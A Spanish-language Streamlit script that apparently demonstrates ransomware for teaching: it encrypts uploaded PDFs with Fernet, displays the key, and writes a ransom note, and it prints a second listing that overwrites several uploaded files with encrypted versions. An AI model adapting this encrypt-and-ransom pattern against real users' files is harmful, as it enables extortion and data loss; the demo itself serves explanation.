import streamlit as st

# Título
st.title("Ransomware")

# Texto
texto = """
El ransomware es una amenaza de gran importancia que continúa creciendo con el paso del tiempo. 
Según el reciente análisis de mitad de año llevado a cabo por Cisco, 
ya domina el mercado de malware y es el tipo de malware más rentable de la historia.
"""

# Mostrar el texto en Streamlit
st.write(texto)



import streamlit as st
from cryptography.fernet import Fernet
from PyPDF2 import PdfReader

# Funciones
def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def encryp(file, key):
    fernet = Fernet(key)
    file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    return file_data, encrypted_data

def mostrar_contenido_pdf(file):
    pdf_reader = PdfReader(file)
    texto_pdf = ""
    for page in pdf_reader.pages:
        texto_pdf += page.extract_text()
    return texto_pdf

# Generar y mostrar la clave
st.title("Cifrador de Archivos PDF")

key = generarKey()
st.write("Clave generada:")
st.code(key.decode(), language="text")

uploaded_file = st.file_uploader("Cargar un archivo PDF", type="pdf")

if uploaded_file:
    # Mostrar el contenido original del archivo PDF
    st.write("Contenido original del archivo PDF:")
    texto_pdf = mostrar_contenido_pdf(uploaded_file)
    st.text_area("Contenido del PDF", value=texto_pdf, height=300)

    # Cifrar el archivo PDF
    original_data, encrypted_data = encryp(uploaded_file, key)
    
    # Guardar el archivo cifrado
    encrypted_file_name = uploaded_file.name + ".encrypted"
    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

    st.write("Archivo PDF cifrado creado con éxito.")
    
    # Mostrar el contenido cifrado del archivo (como bytes, no decodificado)
    st.write("Contenido cifrado del archivo PDF (mostrado en formato hexadecimal):")
    st.code(encrypted_data.hex(), language="text")

    # Crear y guardar el archivo Readme.txt
    with open("Readme.txt", "w") as file:
        file.write("Archivos encriptados\n")
        file.write("Se solicita rescate")
    
    # Descargar el archivo Readme.txt
    with open("Readme.txt", "rb") as file:
        st.download_button(
            label="Descargar Readme.txt",
            data=file,
            file_name="Readme.txt",
            mime="text/plain"
        )

    # Descargar el archivo cifrado
    with open(encrypted_file_name, "rb") as file:
        st.download_button(
            label="Descargar archivo cifrado",
            data=file,
            file_name=encrypted_file_name,
            mime="application/octet-stream"
        )



st.write("""
### Concepto Básico de un Ransomware

Este es un ejemplo básico de cómo funciona un ransomware. Un ransomware cifra archivos en un sistema y solicita un rescate para descifrarlos. A continuación se muestra el código utilizado para cifrar archivos cargados por el usuario.
""")

# Mostrar el código
codigo = '''
import streamlit as st
from cryptography.fernet import Fernet
import os

# Funciones
def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encryp(files, key):
    fernet = Fernet(key)
    for file in files:
        file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)

        # Save the encrypted file
        with open(file.name, "wb") as encrypted_file:
            encrypted_file.write(encrypted_data)

# Generar y retornar la clave
generarKey()
key = retornarKey()

# Streamlit UI
st.title("Cifrador de Archivos")

uploaded_files = st.file_uploader("Cargar archivos", accept_multiple_files=True)

if uploaded_files:
    st.write(f"{len(uploaded_files)} archivos cargados.")
    encryp(uploaded_files, key)
    st.success("Archivos cifrados con éxito.")

    # Crear y guardar el archivo Readme.txt
    with open("Readme.txt", "w") as file:
        file.write("Archivos encryptados\\n")
        file.write("Se solicita rescate")
    st.write("Archivo Readme.txt creado con instrucciones.")

    # Descargar el archivo Readme.txt
    with open("Readme.txt", "rb") as file:
        btn = st.download_button(
            label="Descargar Readme.txt",
            data=file,
            file_name="Readme.txt",
            mime="text/plain"
        )
'''

st.code(codigo, language='python')


# Título
st.title("Ransomware")

# Texto
texto1 = """
El ransomware es una amenaza de gran importancia que continúa creciendo con el paso del tiempo. 
Según el reciente análisis de mitad de año llevado a cabo por Cisco, 
ya domina el mercado de malware y es el tipo de malware más rentable de la historia.
"""

# Mostrar el texto en Streamlit
st.write(texto1)

